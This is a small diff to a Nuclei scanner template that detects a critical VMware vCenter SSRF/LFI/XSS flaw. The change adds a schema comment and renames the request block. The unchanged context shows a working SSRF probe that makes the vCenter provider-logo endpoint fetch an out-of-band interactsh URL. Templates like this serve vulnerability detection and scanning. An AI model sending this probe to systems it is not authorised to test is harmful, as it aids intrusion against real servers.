@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: vmware-vcenter-ssrf
 info:
   name: VMware vCenter SSRF/LFI/XSS
@@ -5,7 +6,7 @@ info:
   severity: critical
   reference: https://github.com/l0ggg/VMware_vCenter
   tags: ssrf,lfi,xss,oast,vcenter,vmware
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/ui/vcav-bootstrap/rest/vcav-providers/provider-logo?url=https://{{interactsh-url}}"
